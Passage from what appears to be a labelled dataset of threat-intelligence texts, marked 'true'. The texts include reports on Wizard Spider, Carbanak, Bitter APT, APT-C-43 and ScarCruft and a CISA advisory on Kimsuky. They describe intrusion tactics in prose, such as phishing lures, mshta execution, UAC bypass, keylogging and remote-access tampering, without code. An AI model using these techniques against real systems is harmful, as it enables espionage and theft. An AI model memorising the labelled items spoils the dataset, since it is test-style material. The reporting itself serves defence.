joint statement from multiple worldwide law enforcement agencies. Indeed, while Russia's destructive attacks earn the biggest headlines, China's espionage campaigns are arguably just as common in the critical infrastructure space. Researchers from Symantec track multiple subgroups within Winnti including Blackfly, Greyfly, and, in this case, Redfly (aka Red Echo). Redfly, they say, is a subsect solely focused on national critical infrastructure attacks. And this latest campaign likely isn't their first foray into national electric grid hacks, having pulled off a similar feat in India two years ago, according to the cybersecurity firm Recorded Future. Exactly why Chinese APTs have taken such an interest in critical industries remains unclear. O'Brien speculates it may have to do with political tensions, energy market trends, or intellectual property theft, but there's no saying for certain. “We don't know the minds of the attackers, so we can only give an educated guess,” he warns. Luckily, he adds, the US and certain other Western countries are well aware of the threat. “The United States is pretty clued in, at this stage, to the threat that cyber could pose to critical infrastructure, and what needs to be done in terms of supporting the organizations who are behind that critical infrastructure. For other countries, it varies.” In fact, he adds, other countries can “maybe learn from their approach — of how CISA has taken up the challenge here.”\n\n\n",

        "original_label": "true",
        "label": "true",
        "explain": "ANALYSIS Wizard Spider, the Russia-linked crew behind high-profile malware Conti, Ryuk and Trickbot, has grown over the past five years into a multimillion-dollar organization that has built a corporate-like operating model, a year-long study has found. In a technical report this week, the folks at Prodaft, which has been tracking the cybercrime gang since 2021, outlined its own findings on Wizard Spider, supplemented by info that leaked about the Conti operation in February after the crooks publicly sided with Russia during the illegal invasion of Ukraine. What Prodaft found was a gang sitting on assets worth hundreds of millions of dollars funneled from multiple sophisticated malware variants. Wizard Spider, we're told, runs as a business with a complex network of subgroups and teams that target specific types of software, and has associations with other well-known miscreants, including those behind REvil and Qbot (also known as Qakbot or Pinkslipbot). In addition, Wizard Spider is full-service. It manages the entire lifecycle of a cyberattack – from the initial intrusion and encryption of data in the compromised organization, to hiring outside help for such jobs as cold-calling ransomware victims to scare them into paying up. If necessary, it buys whatever malicious code it needs, though it is also increasingly building its own tools, such as a hash-cracking application.“The group's extraordinary profitability allows its leaders to invest in illicit research and development initiatives,” the researchers at Prodaft wrote. “Wizard Spider is fully capable of hiring specialist talent, building new digital infrastructure, and purchasing access to advanced exploits.” Wizard Spider, we're told, is “capable of monetizing multiple aspects of its operations. It is responsible for an enormous quantity of spam on hundreds of millions of millions of devices, as well as concentrated data breaches and ransomware attacks on high-value targets.” The malware developed by Wizard Spider – particularly Conti – has got the attention of government officials in the US and aboard. The Conti ransomware was used in an attack that almost shut down Ireland's health care system and, more recently, trashed Costa Rican government agencies. The president of Costa Rica, Rodrigo Chaves, has said his country is at war with whoever is behind Coni. The US government over the past year has issued several alerts about Conti, and earlier this month offered a reward of up to $15 million for information about key figures in the group developing Conti and individuals behind any attacks using a variant of the ransomware.The group's reach is wide, and it has been the subject of research by various cybersecurity teams. According to Prodaft, Wizard Spider controls thousands of client devices worldwide through a cluster of servers running SystemBC proxy malware. The researchers counted 128,036 SystemBC-infected boxes, most of them in Russia (20.5 percent) and the US (12.9 percent). “While these two countries are by far the most popular targets, it's worth pointing out that other major economies like China, India, and Brazil are also well represented,” the threat hunters wrote. “Wizard Spider has a significant presence in almost every developed country in the world, and many emerging economies as well.” Most attacks launched by Wizard Spider start with a massive spam campaign using Qbot, SystemBC, and compromised business email, with the aim to trick marks into downloading and running some of the gang's malware on their Windows PCs. After that “another team uses domain-based selection to pinpoint the valuable targets for their ransom demands and deploy Cobalt Strike for lateral movement activities,” they wrote. “If the intrusion team successfully obtains the domain admin privilege, they deploy Conti's ransomware strain.” A Wizard Spider sub-team, for example, specializes in infecting hypervisor servers, such as machines powered by VMware's ESXi, with the Conti ransomware. Once data is exfiltrated from a victim's boxen, the crooks upload malicious code that encrypts information and leaves a ransom note. The group manages victims through a locker control panel. The researchers also found that the crew directly scanned for and exploited hundreds of VMware vCenter servers using the widespread Log4j vulnerability – dubbed Log4Shell – and several of the IP addresses used for scanning were also used for Cobalt Strike command-and-control (C2) servers in later attacks.Wizard Spider also invested in developing its own technologies, including a custom toolkit for exploiting security flaws, including the Log4j hole and a custom voice-over-IP (VoIP) system used by the operators to call victims to demand ransoms are paid. The cold-calling system stores reports of calls that sub-teams can use when further pressuring victims. The reports include everything from the unique name the extortionists give to their victims, the time of the ransomware attack, and a call status that uses “1” for a successful call and “0” for calls that are not successful or have yet to be made. There also is a custom hash-cracking system that “stores cracked hashes, updates threat actors on the cracking status and shows the results of cracking attempts on other servers,” the threat hunters wrote. The software claims it can crack a broad array of common hash types, including LM:NTLM hashes, cached domain credentials, Kerberos 5 TGS-REP/AS-REP tickets, KeePass files, and those used for MS Office 2013 documents. The hash-cracking management app is also used as a communication tool for tracking the crew's work, indicating that it plays a central role in how Wizard Spider's business operates. As of the time of the Prodaft report, there were 32 active users in the cracking suite. The analysts were surprised to learn of a link between Wizard Spider and REvil, the ransomware group that put a wrecking ball through global meat supplier JBS and IT software maker Kaseya. Wizard Spider's servers used for its extortion campaigns occasionally copy their data to a backup server in Russia that has a disk size of about 26TB. The Prodaft researchers found data in this backup storage that was stolen from some organizations that were also attacked by the REvil during the first quarter of 2021. “It presents a worrying example of the collaboration between the ransomware gangs,” the cyberexperts wrote. “However, we do not have any further information to confirm whether the Wizard Spider team carried out these attacks or the stolen data transferred from REvil's servers into backup storage.”\n\n\n",

See the ATT&CK for Enterprise version 7 for all referenced threat actor tactics and techniques. This joint cybersecurity advisory was coauthored by the Cybersecurity and Infrastructure Security Agency (CISA), the Federal Bureau of Investigation (FBI), and the U.S. Cyber Command Cyber National Mission Force (CNMF). This advisory describes the tactics, techniques, and procedures (TTPs) used by North Korean advanced persistent threat (APT) group Kimsuky—against worldwide targets—to gain intelligence on various topics of interest to the North Korean government. The U.S. Government refers to malicious cyber activity by the North Korean government as HIDDEN COBRA. For more information on HIDDEN COBRA activity, visit https://www.us-cert.cisa.gov/northkorea. This advisory describes known Kimsuky TTPs, as found in open-source and intelligence reporting through July 2020. The target audience for this advisory is commercial sector businesses desiring to protect their networks from North The Kimsuky APT group has most likely been operating since 2012. Kimsuky is most likely tasked by the North Korean regime with a global intelligence gathering mission. Kimsuky employs common social engineering tactics, spearphishing, and watering hole attacks to exfiltrate desired information from victims.[. Kimsuky is most likely to use spearphishing to gain initial access into victim hosts or networks. Kimsuky conducts its intelligence collection activities against individuals and organizations in South Korea, Japan, and the United States. Kimsuky focuses its intelligence collection activities on foreign policy and national security issues related to the Korean peninsula, nuclear policy, and sanctions. Individuals identified as experts in various fields, CISA, FBI, and CNMF recommend individuals and organizations within this target profile increase their defenses and adopt a heightened state of awareness. Particularly important mitigations include safeguards against spearphishing, use of multi-factor authentication, and user awareness training. Kimsuky uses various spearphishing and social engineering methods to obtain Initial Access [TA0001] to victim networks.[9],[10],[11] Spearphishing—with a malicious attachment embedded in the email—is the most observed Kimsuky tactic (Phishing: Spearphishing Attachment [T1566.001]).[12],[13] The APT group has used web hosting credentials—stolen from victims outside of their usual targets—to host their malicious scripts and tools. Kimsuky likely obtained the credentials from the victims via spearphishing and credential harvesting scripts. On the victim domains, they have created subdomains mimicking legitimate sites and services they are spoofing, such as Google or Yahoo mail.[14] Kimsuky has also sent benign emails to targets, which were possibly intended to build trust in advance of a follow-on email with a malicious attachment or link. Posing as South Korean reporters, Kimsuky exchanged several benign interview-themed emails with their intended target to ostensibly arrange an interview date and possibly build rapport. The emails contained the subject line “Skype Interview requests of [Redacted TV Show] in Seoul,” and began with a request to have the recipient appear as a guest on the show. The APT group invited the targets to a Skype interview on the topic of inter-Korean issues and denuclearization negotiations on the Korean Peninsula. After a recipient agreed to an interview, Kimsuky sent a subsequent email with a malicious document, either as an attachment or as a Google Drive link within the body. The document usually contained a variant of BabyShark malware (see the Execution section for information on BabyShark). When the date of the interview drew near, Kimsuky sent an email canceling the interview. Kimsuky tailors its spearphishing and social engineering approaches to use topics relevant to the target, such as COVID-19, the North Korean nuclear program, or media interviews.[15],[16],[17] Kimsuky’s other methods for obtaining initial access include login-security-alert-themed phishing emails, watering hole attacks, distributing malware through torrent sharing sites, and directing victims to install malicious browser extensions (Phishing: Spearphising Link [T1566.002], Drive-by Compromise [T1189], Man-in-the-Browser [T1185]).[18] After obtaining initial access, Kimsuky uses BabyShark malware and PowerShell or the Windows Command Shell for Execution [TA0002].BabyShark is Visual Basic Script (VBS)-based malware. First, the compromised host system uses the native Microsoft Windows utility, mshta.exe, to download and execute an HTML application (HTA) file from a remote system (Signed Binary Proxy Execution: Mshta [T1218.005]). The HTA file then downloads, decodes, and executes the encoded BabyShark VBS file. The script maintains Persistence [TA0003] by creating a Registry key that runs on startup (Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder [T1547.001]). It then collects system information (System Information Discovery [T1082]), sends it to the operator’s command control (C2) servers, and awaits further commands.[19],[20],[21],[22] Open-source reporting indicates BabyShark is delivered via an email message containing a link or an attachment (see Initial Access section for more information) (Phishing: Spearphising Link [T1566.002], Phishing: Spearphishing Attachment [T1566.001]). Kimsuky tailors email phishing messages to match its targets’ interests. Observed targets have been U.S. think tanks and the global cryptocurrency industry.[23] Kimsuky uses PowerShell to run executables from the internet without touching the physical hard disk on a computer by using the target’s memory (Command and Scripting Interpreter: PowerShell [T1059.001]). PowerShell commands/scripts can be executed without invoking powershell.exe through HTA files or mshta.exe.[24],[25],[26],[27] Kimsuky has demonstrated the ability to establish Persistence [TA0003] through using malicious browser extensions, modifying system processes, manipulating the autostart execution, using Remote Desktop Protocol (RDP), and changing the default file association for an application. By using these methods, Kimsuky can gain login and password information and/or launch malware outside of some application allowlisting solutions. In 2018, Kimsuky used an extension, which was available on the Google Chrome Web Store, to infect victims and steal passwords and cookies from their browsers (Man-in-the-Browser [T1185]). The extension’s reviews gave it a five-star rating, however the text of the reviews applied to other extensions or was negative. The reviews were likely left by compromised Google+ accounts.[28] Kimsuky may install a new service that can execute at startup by using utilities to interact with services or by directly modifying the Registry keys (Boot or Logon Autostart Execution [T1547]). The service name may be disguised with the name from a related operating system function or by masquerading as benign software. Services may be created with administrator privileges but are executed under system privileges, so an adversary can also use a service to escalate privileges from Administrator to System. They can also directly start services through Service Execution.[29],[30] During the STOLEN PENCIL operation in May 2018, Kimsuky used the GREASE malware. GREASE is a tool capable of adding a Windows administrator account and enabling RDP while avoiding firewall rules (Remote Services: Remote Desktop Protocol [T1021.001]).[31] Kimsuky uses a document stealer module that changes the default program associated with Hangul Word Processor (HWP) documents (.hwp files) in the Registry (Event Triggered Execution: Change Default File Association [T1546.001]). Kimsuky manipulates the default Registry setting to open a malicious program instead of the legitimate HWP program (HWP is a Korean word processor). The malware will read and email the content from HWP documents before the legitimate HWP program ultimately opens the document.[32] Kimsuky also targets Microsoft Office users by formatting their documents in a .docx file rather than .hwp and will tailor their macros accordingly.[33] Kimsuky maintains access to compromised domains by uploading actor-modified versions of open-source Hypertext Processor (PHP)-based web shells; these web shells enable the APT actor to upload, download, and delete files and directories on the compromised domains (Server Software Component: Web Shell [T1505.003]). The actor often adds “Dinosaur” references within the modified web shell codes.[34] Privilege Escalation Kimsuky uses well-known methods for Privilege Escalation [TA0004]. These methods include placing scripts in the Startup folder, creating and running new services, changing default file associations, and injecting malicious code in explorer.exe. Kimsuky has used Win7Elevate—an exploit from the Metasploit framework—to bypass the User Account Control to inject malicious code into explorer.exe (Process Injection [T1055]). This malicious code decrypts its spying library—a collection of keystroke logging and remote control access tools and remote control download and execution tools—from resources, regardless of the victim’s operating system. It then saves the decrypted file to a disk with a random but hardcoded name (e.g., dfe8b437dd7c417a6d.tmp) in the user’s temporary folder and loads this file as a library, ensuring the tools are then on the system even after a reboot. This allows for the escalation of privileges.[35] Before the injection takes place, the malware sets the necessary privileges (see figure 1). The malware writes the path to its malicious Dynamic Link Library (DLL) and ensures the remote process is loaded by creating a remote thread within explorer.exe (Process Injection [T1055]).[36] Kimsuky has used a keylogger that deletes exfiltrated data on disk after it is transmitted to its C2 server (Indicator Removal on Host: File Deletion [T1070.004]).[42] Kimsuky has used mshta.exe, which is a utility that executes Microsoft HTAs. It can be used for proxy execution of malicious .hta files and JavaScript or VBS through a trusted windows utility (Signed Binary Proxy Execution: Mshta [T1218.005]). It can also be used to bypass application allow listing solutions (Abuse Elevation Control Mechanism: Bypass User Access Control [T1548.002]).[43],[44] Win7Elevate—which was noted above—is also used to evade traditional security measures. Win7Elevatve is a part of the Metasploit framework open-source code and is used to inject malicious code into explorer.exe (Process Injection [T1055]). The malicious code decrypts its spying library from resources, saves the decrypted file to disk with a random but hardcoded name in the victim's temporary folder, and loads the file as a library.[45],[46],[47] Credential Access Kimsuky uses legitimate tools and network sniffers to harvest credentials from web browsers, files, and keyloggers (Credential Access [TA0006]). Kimsuky uses memory dump programs instead of using well-known malicious software and performs the credential extraction offline. Kimsuky uses ProcDump, a Windows command line administration tool, also available for Linux, that allows a user to create crash dumps/core dumps of processes based upon certain criteria, such as high central processing unit (CPU) utilization (OS Credential Dumping [T1003]). ProcDump monitors for CPU spikes and generates a crash dump when a value is met; it passes information to a Word document saved on the computer. It can be used as a general process dump utility that actors can embed in other scripts, as seen by Kimsuky’s inclusion of ProcDump in the BabyShark malware.[48] According to open-source security researchers, Kimsuky abuses a Chrome extension to steal passwords and cookies from browsers (Man-in-the-Browser [T1185]).[49],[50] The spearphishing email directs a victim to a phishing site, where the victim is shown a benign PDF document but is not able to view it. The victim is then redirected to the official Chrome Web Store page to install a Chrome extension, which has the ability to steal cookies and site passwords and loads a JavaScript file, named jQuery.js, from a separate site (see figure 3).[51] Machine generated alternative text: Kimsuky also uses a PowerShell based keylogger, named MECHANICAL, and a network sniffing tool, named Nirsoft SniffPass (Input Capture: Keylogging [T1056.001], Network Sniffing [T1040]). MECHANICAL logs keystrokes to %userprofile%\\appdata\\roaming\\apach.{txt,log} and is also a “cryptojacker,” which is a tool that uses a victim’s computer to mine cryptocurrency. Nirsoft SniffPass is capable of obtaining passwords sent over non-secure protocols.[53] Kimsuky used actor-modified versions of PHProxy, an open-source web proxy written in PHP, to examine web traffic between the victim and the website accessed by the victims and to collect any credentials entered by the victim.[54] Kimsuky enumerates system information and the file structure for victims’ computers and networks (Discovery [TA0007]). Kimsuky appears to rely on using the victim’s operating system command prompt to enumerate the file structure and system information (File and Directory Discovery [T1083]). The information is directed to C:\\WINDOWS\\msdatl3.inc, read by malware, and likely emailed to the malware’s command server.[55] Kimsuky collects data from the victim system through its HWP document malware and its keylogger (Collection [TA0009]). The HWP document malware changes the default program association in the Registry to open HWP documents (Event Triggered Execution: Change Default File Association [T1546.001]). When a user opens an HWP file, the Registry key change triggers the execution of malware that opens the HWP document and then sends a copy of the HWP document to an account under the adversary’s control. The malware then allows the user to open the file as normal without any indication to the user that anything has occurred. The keylogger intercepts keystrokes and writes them to C:\\Program Files\\Common Files\\System\\Ole DB\\msolui80.inc and records the active window name where the user pressed keys (Input Capture: Keylogging [T1056.001]). There is another keylogger variant that logs keystrokes into C:\\WINDOWS\\setup.log.[56] Kimsuky has also used a Mac OS Python implant that gathers data from Mac OS systems and sends it to a C2 server (Command and Scripting Interpreter: Python [T1059.006]). The Python program downloads various implants based on C2 options specified after the filedown.php (see figure 4). Kimsuky has used a modified TeamViewer client, version 5.0.9104, for Command and Control [TA0011] (Remote Access Software [T1219]). During the initial infection, the service “Remote Access Service” is created and adjusted to execute C:\\Windows\\System32\\vcmon.exe at system startup (Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder [T1547.001]). Every time vcmon.exe is executed, it disables the firewall by zeroing out Registry values (Impair Defenses: Disable or Modify System Firewall [T1562.004]). The program then modifies the TeamViewer Registry settings by changing the TeamViewer strings in TeamViewer components. The launcher then configures several Registry values, including SecurityPasswordAES, that control how the remote access tool will work. The SecurityPasswordAES Registry value represents a hash of the password used by a remote user to connect to TeamViewer Client (Use Alternate Authentication Material: Pass the Hash [T1550.002]). This way, the attackers set a pre-shared authentication value to have access to the TeamViewer Client. The attacker will then execute the TeamViewer client netsvcs.exe.[58] Kimsuky has been using a consistent format. In the URL used recently—express[.]php?op=1—there appears to be an option range from 1 to 3.[59] Open-source reporting from cybersecurity companies describes two different methods Kimsuky has used to exfiltrate stolen data: via email or through an RC4 key generated as an MD5 hash or a randomly generated 117-bytes buffer (Exfiltration [TA0010]). There was no indication that the actor destroyed computers during the observed exfiltrations, suggesting Kimsuky’s intention is to steal information, not to disrupt computer networks. Kimsuky’s preferred method for sending or receiving exfiltrated information is through email, with their malware on the victim machine encrypting the data before sending it to a C2 server (Archive Collected Data [T1560]). Kimsuky also sets up auto-forward rules within a victim’s email account (Email Collection: Email Forwarding Rule [T1114.003]). Kimsuky also uses an RC4 key generated as an MD5 hash or a randomly generated 117-bytes buffer to exfiltrate stolen data. The data is sent RSA-encrypted (Encrypted Channel: Symmetric Cryptography [T1573.001]). Kimsuky’s malware constructs an 1120-bit public key and uses it to encrypt the 117-bytes buffer. The resulting data file is saved in C:\\Program Files\\Common Files\\System\\Ole DB\\ (Data Staged: Local Data Staging [T1074.001]).\n\n\n",

Kimsuky, active since 2013 to commit cyber espionage on the behalf of Jong-Un's regime, is also evolving tactics beyond this protocol to gain remote control of compromised desktop systems in recent attacks, according to the researchers. North Korea's Kimsuky advanced persistent threat (APT) continues to evolve its attack methods and grow in sophistication, expanding its ability to control victims' systems with the use of legitimate system remote-desktop tools and novel custom malware in its latest attacks. Overall, recent attacks show Kimsuky continuing to use spear phishing as its initial method of access to compromise systems with BabyShark, its oft-used custom malware for persistence and the collection of system info, before attackers move on to installing other custom-built and open source malware. The threat group — one of several that work at the behest of North Korean Supreme Leader Kim Jong-Un — recently has been spotted abusing Remote Desktop Protocol (RDP) and other tools that allow it to remotely take over targeted systems, even installing open source software to an environment if RDP is not present, researchers from South Korea's AhnLab revealed in a blog post Oct. 18. With lines beginning to blur between Kimsuky and other North Korea-sponsored groups like Lazarus as they organize and align to share tools and tactics, it's important that organizations do what they can to protect themselves against these evolving threats, according to AhnLab.",

        "explain": "Intezer researchers uncovered a cyberespionage campaign targeting the Chinese nuclear energy sector, they linked it to the Bitter APT group. The Bitter APT group is a South Asian cyberespionage group active since at least 2021. The group focuses on energy and government sectors, in the past, the group targeted organizations in Pakistan, China, Bangladesh, and Saudi Arabia. In recent attacks, experts noted updates to the first-stage payloads and the implementation of new layers of obfuscation to avoid detection. Threat actors also employed additional decoys for social engineering. Experts identified seven phishing emails that were used in the phishing campaign aimed at recipients in China’s nuclear energy industry. The phishing messages impersonated the Embassy of Kyrgyzstan in China, inviting them to join conferences on subjects that are relevant to the recipients. “We identified seven emails pretending to be from the Embassy of Kyrgyzstan, being sent to recipients in the nuclear energy industry in China. In some emails, people and entities in academia are also targeted, also related to nuclear energy. The phishing emails contain a lure that invites the recipients to join conferences on subjects that are relevant to them.” reads the report published by Intezer. “The lures are designed to socially engineer the recipient to download and open an attached RAR file that contains either a Microsoft Compiled HTML Help (CHM) or Excel payload.” The messages attempt to trick recipients into opening an attached RAR archive that contains CHM or Excel payloads created to achieve persistence and fetch additional payloads from the C2. “The Excel payloads simply contain an Equation Editor exploit that creates two different scheduled tasks. There is no decoy in the document.” contnues the report. “One scheduled task (shown below) runs every 15 minutes, to download a next stage EXE payload using cURL, also sending the actor the name of the infected machine. These tactics have been observed being used by Bitter APT in 2021/2022.” “Bitter APT have been conducting espionage campaigns for years using many tactics, including phishing, to achieve their goals. It is advised that entities in government, energy, and engineering especially those in the Asia-Pacific region should remain vigilant when receiving emails, especially those claiming to be from other diplomatic entities.” Intezer concludes.\n\n\n",

        "original_label": "true",
        "label": "true",
        "explain": "The story of Carbanak began when a bank from Ukraine asked us to help with a forensic investigation. Money was being mysteriously stolen from ATMs. Our initial thoughts tended towards the Tyupkin malware. However, upon investigating the hard disk of the ATM system we couldn’t find anything except a rather odd VPN configuration (the netmask was set to 172.0.0.0). At this time we regarded it as just another malware attack. Little did we know then that a few months later one of our colleagues would receive a call at 3 a.m. in the middle of the night. On the phone was an account manager, asking us to call a certain number as matter of urgency. The person at the end of the line was the CSO of a Russian bank. One of their systems was alerting that data was being sent from their Domain Controller to the People’s Republic of China.When we arrived on site we were quickly able to find the malware on the system. We wrote a batch script that removed the malware from an infected PC, and ran this script on all the computers at the bank. This was done multiple times until we were sure that all the machines were clean. Of course, samples were saved and through them we encountered the Carbanak malware for the first time.Further forensic analysis took us to the point of initial infection: a spear phishing e-mail with a CPL attachment; although in other cases Word documents exploiting known vulnerabilities were used. After executing the shellcode, a backdoor based on Carberp, is installed on the system. This backdoor is what we know today as Carbanak. It is designed for espionage, data exfiltration and remote control.Once the attackers are inside the victim´s network, they perform a manual reconnaissance, trying to compromise relevant computers (such as those of administrators’) and use lateral movement tools. In short, having gained access, they will jump through the network until they find their point of interest. What this point of interest is, varies according to the attack. What they all have in common, however, is that from this point it is possible to extract money from the infected entity. The gang behind Carbanak does not necessarily have prior knowledge of the inner workings of each bank targeted, since these vary per organisation. So in order to understand how a particular bank operates, infected computers were used to record videos that were then sent to the Command and Control servers. Even though the quality of the videos was relatively poor, they were still good enough for the attackers, armed also with the keylogged data for that particular machine to understand what the victim was doing. This provided them with the knowledge they needed to cash out the money.During our investigation we found several ways of cashing out: ATMs were instructed remotely to dispense cash without any interaction with the ATM itself, with the cash then collected by mules; the SWIFT network was used to transfer money out of the organisation and into criminals’ accounts; and databases with account information were altered so that fake accounts could be created with a relatively high balance, with mule services being used to collect the money.Since we started investigating this campaign we have worked very closely with the law enforcement agencies (LEAs) tracking the Carbanak group. As a result of this cooperation we know that up to 100 targets have been hit. When it comes to financial institutions, In at least half of the cases the criminals were able to extract money from the infected institution. Losses per bank range from $2.5 million to approximately $10 million. However, according to information provided by LEAs and the victims themselves, total financial losses could be as a high as $1 billion, making this by far the most successful criminal cyber campaign we have ever seen.Our investigation began in Ukraine and then moved to Moscow, with most of the financial entities targeted by the group located in Eastern Europe. However thanks to KSN data and data obtained from the Command and Control servers, we know that Carbanak also targets victims in the USA, Germany and China. Now the group is expanding its operations to new areas. These include Malaysia, Nepal, Kuwait and several regions in Africa, among others. The group is still active, and we urge all financial organizations to carefully scan their networks for the presence of Carbanak. If detected, report the intrusion to law enforcement immediately.Carbanak is the name we use for an APT-style campaign targeting (but not limited to) financial institutions. The main difference with other APT attacks is that attackers do not see data but money as their primary target. We say APT-like, however the attack is not strictly speaking Advanced. Strictly speaking, the main feature defining the attackers is Persistence. We name the backdoor Carbanak since it is based on Carberp and the name of the configuration file is “anak.cfg”.The attackers infiltrate the victim´s network looking for the critical system they can use for cashing money out. Once they have stolen a significant amount of money (from 2.5 to 10 MM USD per entity), they abandon the victim.Banking entities have always been a primary target for cybercriminals. However it was almost always through their customers. This time attackers are targeting financial entities directly in an unprecedented, determined, highly professional and coordinated attack, and using any means from the target to cash as much money out as possible, up to an apparently auto-imposed limit.According to what we know, the first malicious samples were compiled in August, 2013 when the cybercriminals started to test the Carbanak malware. The first infections were detected in December, 2013. On average, each bank robbery took between two and four months, from infecting the first computer at the bank’s corporate network to cashing the money out. We believe that the gang was able to successfully steal from their first victims during the period of February-April 2014. The peak of infections was recorded in June 2014. Currently the campaign is still active.Since we started working on this campaign we have collaborated with the different LEAs involved in the investigation and helped them as much as possible. As it remains an open investigation, we were asked not to share any details until it was safe to do so.Yes, this investigation turned into a joint operation between Kaspersky Lab’s Global Research and Analysis Team and international organizations, national and regional law enforcement agencies and a number of Computer Emergency Response Teams (CERTs) worldwide. One of our main goals was to disseminate our knowledge of the campaign and IOCs among all detected and potential victims. We used national CERTs and LEAs as the distribution channel.We’re helping to assist in investigations and countermeasures that disrupt malware operations and cybercriminal activity. During the investigations we provide technical expertise such as analyzing infection vectors, malicious programs, supported Command & Control infrastructure and exploitation methods.Attackers used spear phishing emails with malicious attachments against employees of the targeted financial institutions, in some cases sending them to their personal email addresses. We believe the attackers also used drive by download attacks, but this second assumption is still not 100% confirmed.Based on what the attackers stole from victims, a new victim faces potential losses of up to 10 million $. However this figure is arbitrary based on what we know: nothing limits the potential loss once an institution is infected.Victims are mainly institutions in the financial industry; however we have also found traces of infections in POS terminals and PR agencies. For a sense of the scale of the attack please see the different charts and maps we provide in our report. As with many malware campaigns there are a variety of companies/individuals analyzing the malware, resulting in requests to the Command and Control server. When we analyze those servers, all we see are the IPs and possibly some additional information. When this additional information is not present, and when the IP cannot be traced back to its owner, we mark it as an infection. Based on this approach our analysis concludes that Russia, the US, Germany and China are the most affected countries in number of traces of infection (IP addresses).Yes, we detect Carbanak samples as Backdoor.Win32.Carbanak and Backdoor.Win32.CarbanakCmd. All Kaspersky Lab’s corporate products and solutions detect known Carbanak samples. To raise the level of protection, it is recommended to switch on Kaspersky’s Proactive Defense Module included in each modern product and solution. We also have some general recommendations: Do not open suspicious emails, especially if they have an attachment; Update your software (in this campaign no 0days were used); Turn on heuristics in your security suites, this way it is more likely that such new samples will be detected and stopped from the beginning.\n\n\n",

        "explain": "Learn more about 360 Total Security In June 2020, 360 Security Center discovered a new backdoor Pyark written in Python by the fileless attack protection function. Through in-depth excavation and trace analysis of the backdoor, we discovered a series of advanced threat actions that have been active since 2019. By invading various military institutions in Venezuela, the attackers deployed backdoor to continuously monitor and steal the latest military secrets. We named it APT-C-43 based on 360’s way of naming the APT organization When tracing the attacker’s source, we found that the duration of this attack coincided with the Venezuelan political chaos, and the network assets used by the attackers were mostly deployed in Colombia, and some assets were frequently found in Venezuela and Colombia. After the United Venezuelan coup, the reactionary government headed by Juan Gerardo Guaidó Márquez fled to Colombia to seek military assistance. We guess the political background of APT-C -43’s campaign may be to help the reactionaries led by Juan steal military secrets of the Venezuelan military and provide intelligence support for the confrontation between the reactionary government and the current Venezuelan government. Therefore, we named this series of attacks HpReact. In the process of tracing the source, the campaign was linked to the APT group Machete, and Machete can be traced back to 2010. The organization is an APT organization with Spanish roots. Its targets are military, embassies and government agencies in Latin America. the Lord. Obviously, the HpReact campaign is only a small part of the organization’s cyber warfare in Latin America. The picture below shows the decoy document used by APT-C-43 in this campaign. The content of the document is a policy issued by the Venezuelan authorities to prevent deserters from going to Colombia to support the reactionary government. More about this policy. For details, please refer to Appendix 1. It can be seen that the attackers have a good understanding of Venezuela’s current politics, military, etc., and are good at using such sensitive files to make decoy documents, which are highly targeted and inductive.The APT-C-43 organization is good at launching attacks using phishing emails, and deploys the backdoor program Pyark (Machete) written in python after invading the victim’s machine. The network communication mainly relies on FTP and HTTP protocols.After successfully infiltrating the target machine, APT-C-43 organization monitors the target users, steal sensitive data, etc. The complete process of infecting the target machine is as follows: The decoy document carries malicious macrocode. Download the next stage of malicious component NisSrv.bat through FTP protocol, and we can see many variables named after Spanish vocabulary in the code, such as servidor (server), Usuario (user name), Contraseña (password), etc.:The file of “setupXOX.msi” is a Windows Installer installation program made by MSI Wrapper to deploy the final backdoor components. When we studied the historical samples of the Machete organization, we found that the organization’s technology for deploying backdoor has undergone an important change, with a clear time division. Through the following timeline, we can clearly see that the organization is constantly changing and innovating its own Attack technique:After the program runs, the Fpyark backdoor components will be released to the %ProgramData%\\USOEnable directory. The backdoor of Fpyark is writing by python. During the running process, python is required to execute the environment and various dependent libraries required by the script, which also caused the size of setupXOX.msi to reach 8.10M. After installation, the entire directory structure is as follows: After deploying the above backdoor components, run svchostt.exe according to the msiwpper configuration file:The file of “setupXOX.msi” is a virus releaser written in Microsoft Visual Basic language, which releases NisSrv.bat registered scheduled tasks to realize self-starting and staying. The program has the following vbp compilation path: UpdateSession is the main control module of the backdoor. Its functions include self-starting of the backdoor, collection of network configuration, keystroke records, and schedule other modules to execute by means of timers:UpdateService traverses the disk directory and collects more than ten kinds of sensitive files with suffixes such as doc, xlsx, and pdf in other directories, except for some system directories and security software directories.The entire campaign of HpReact highly coincides with the timeline of Venezuelan political turmoil. APT-C-43 took Venezuelan military agencies as the main targets and carried out surveillance and stealing activities for about two years, forming a significant impact on Venezuela’s national security. Great safety hazard. In recent years, with the intensification of cyber warfare in various countries, cyberspace security has become another important area for each country to maintain national security, and building a strong cybersecurity has become a top priority for each country. At present, 360 Total Security has supported the detection of attacks on this organization.360 Baize Lab (formerly 360 FirstAid team): Focusing on BOOTKIT/ROOTKIT Trojan analysis and traceability, it was the first to discover the world’s first UEFI Trojan Spy Shadow（UEFI⽊马谍影），boot area Trojan Hidden Soul（引导区⽊马隐魂），dual guns（双枪,）and multiple large-scale dark brush botnets, such as black fog and diaster. Now it is renamed 360 Baize Lab based on the original business, it is involved in APT testing and research. The laboratory provides core safety data for 360 Security Guards, 360 FirstAid team and other products, as well as stubborn Trojan detection and killing solutions, while providing 360 Security Center Technical Support.\n\n\n",

        "explain": "SentinelLabs observed a campaign by ScarCruft, a suspected North Korean APT group, targeting media organizations and high-profile experts in North Korean affairs. We recovered malware in the planning and testing phases of Scarcruft’s development cycle, presumably intended for use in future campaigns. ScarCruft has been experimenting with new infection chains, including the use of a technical threat research report as a decoy, likely targeting consumers of threat intelligence like cybersecurity professionals. ScarCruft remains committed to acquiring strategic intelligence and possibly intends to gain insights into non-public cyber threat intelligence and defense strategies.In collaboration with NK News, SentinelLabs has been tracking campaigns targeting experts in North Korean affairs from South Korea’s academic sector and a news organization focused on North Korea. We observed persistent targeting of the same individuals over a span of two months. Based on the specific malware, delivery methods, and infrastructure, we assess with high confidence that the campaigns are orchestrated by ScarCruft. Also known as APT37 and InkySquid, ScarCruft is a suspected North Korean advanced persistent threat (APT) group with a long history of targeted attacks against individuals as well as public and private entities, primarily in South Korea. In addition, we retrieved malware that we assess is currently in the planning and testing phases of ScarCruft’s development cycle and will likely be used in future campaigns. In an interesting twist, ScarCruft is testing malware infection chains that use a technical threat research report on Kimsuky as a decoy document. Kimsuky is another suspected North Korean threat group observed to share operational characteristics with ScarCruft, like infrastructure and C2 server configurations. Given ScarCruft’s practice of using decoy documents relevant to targeted individuals, we suspect that the planned campaigns will likely target consumers of technical threat intelligence reports, like threat researchers, 